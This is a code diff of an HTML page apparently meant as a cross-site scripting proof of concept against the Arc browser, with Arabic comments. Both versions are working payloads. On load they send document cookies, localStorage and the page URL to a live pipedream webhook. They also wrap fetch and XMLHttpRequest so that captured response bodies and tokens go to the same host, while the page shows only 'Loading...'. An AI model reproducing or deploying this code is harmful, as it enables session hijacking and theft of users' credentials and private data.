@@ -1,115 +1,96 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Arc XSS PoC Enhanced</title>
-</head>
+<head><meta charset="UTF-8" /><title>Arc XSS Full Monitor</title></head>
 <body>
-  <script>
-    console.log("✅ Enhanced JS is running inside Arc!");
+<script>
+  const WEBHOOK_URL = "https://eoeisd0pus6doy3.m.pipedream.net/";
 
-    const WEBHOOK_URL = "https://eoeisd0pus6doy3.m.pipedream.net/";
+  function sendToWebhook(data) {
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    }).catch(err => console.error("Failed sending data:", err));
+  }
 
-    // دالة إرسال البيانات للويب هوك مع console log للمتابعة
-    function sendToWebhook(data) {
-      fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-      .then(res => console.log("📡 Data sent to webhook:", res.status))
-      .catch(err => console.error("❌ Failed to send data:", err));
-    }
+  // مراقبة fetch
+  (function(){
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      return originalFetch.apply(this, args).then(async response => {
+        const cloned = response.clone();
+        let responseBody = null;
 
-    // مراقبة ردود fetch
-    (function() {
-      const originalFetch = window.fetch;
-      window.fetch = function(...args) {
-        return originalFetch.apply(this, args).then(async response => {
-          try {
-            // محاولة قراءة الرد كـ json
-            const clonedResponse = response.clone();
-            const data = await clonedResponse.json();
-
-            // تحقق لو الرد يحتوي على توكنات
-            if (data && (data.token || data.access_token || data.id_token)) {
-              sendToWebhook({
-                type: "fetch-response-token",
-                url: response.url,
-                tokens: {
-                  token: data.token,
-                  access_token: data.access_token,
-                  id_token: data.id_token
-                },
-                timestamp: new Date().toISOString()
-              });
-            }
-          } catch (e) {
-            // مش JSON، نتجاهل الخطأ
-          }
-          return response;
-        });
-      };
-    })();
-
-    // مراقبة ردود XMLHttpRequest
-    (function() {
-      const originalOpen = XMLHttpRequest.prototype.open;
-      const originalSend = XMLHttpRequest.prototype.send;
-
-      XMLHttpRequest.prototype.open = function(method, url) {
-        this._url = url;
-        return originalOpen.apply(this, arguments);
-      };
-
-      XMLHttpRequest.prototype.send = function(body) {
-        this.addEventListener("load", () => {
-          try {
-            let responseData;
-            try {
-              responseData = JSON.parse(this.responseText);
-            } catch {
-              return; // ليس JSON، نتجاهل
-            }
-
-            if (responseData && (responseData.token || responseData.access_token || responseData.id_token)) {
-              sendToWebhook({
-                type: "xhr-response-token",
-                url: this._url,
-                tokens: {
-                  token: responseData.token,
-                  access_token: responseData.access_token,
-                  id_token: responseData.id_token
-                },
-                timestamp: new Date().toISOString()
-              });
-            }
-          } catch (e) {
-            // خطأ، تجاهل
-          }
-        });
-        return originalSend.apply(this, arguments);
-      };
-    })();
-
-    // إرسال بيانات عامة كبداية
-    sendToWebhook({
-      type: "initial-info",
-      cookies: document.cookie || "No cookies",
-      localStorage: (() => {
         try {
-          return Object.assign({}, localStorage);
+          responseBody = await cloned.json();
         } catch {
-          return "Access denied";
+          try {
+            responseBody = await cloned.text();
+          } catch {}
         }
-      })(),
-      userAgent: navigator.userAgent,
-      url: window.location.href,
-      timestamp: new Date().toISOString()
-    });
 
-  </script>
+        sendToWebhook({
+          type: "fetch-response",
+          url: response.url,
+          status: response.status,
+          statusText: response.statusText,
+          body: responseBody,
+          timestamp: new Date().toISOString()
+        });
 
-  <p style="font-family: sans-serif;">Loading...</p>
+        return response;
+      });
+    };
+  })();
+
+  // مراقبة XMLHttpRequest
+  (function(){
+    const originalOpen = XMLHttpRequest.prototype.open;
+    const originalSend = XMLHttpRequest.prototype.send;
+
+    XMLHttpRequest.prototype.open = function(method, url) {
+      this._method = method;
+      this._url = url;
+      return originalOpen.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.send = function(body) {
+      this.addEventListener("load", () => {
+        let responseBody = null;
+        try {
+          responseBody = JSON.parse(this.responseText);
+        } catch {
+          responseBody = this.responseText;
+        }
+
+        sendToWebhook({
+          type: "xhr-response",
+          method: this._method,
+          url: this._url,
+          status: this.status,
+          statusText: this.statusText,
+          body: responseBody,
+          timestamp: new Date().toISOString()
+        });
+      });
+
+      return originalSend.apply(this, arguments);
+    };
+  })();
+
+  // إرسال بيانات أولية
+  sendToWebhook({
+    type: "initial-info",
+    url: window.location.href,
+    cookies: document.cookie || "No cookies",
+    localStorage: (() => {
+      try { return Object.assign({}, localStorage); }
+      catch { return "Access denied"; }
+    })(),
+    userAgent: navigator.userAgent,
+    timestamp: new Date().toISOString()
+  });
+</script>
+<p style="font-family: sans-serif;">Loading...</p>
 </body>
 </html>
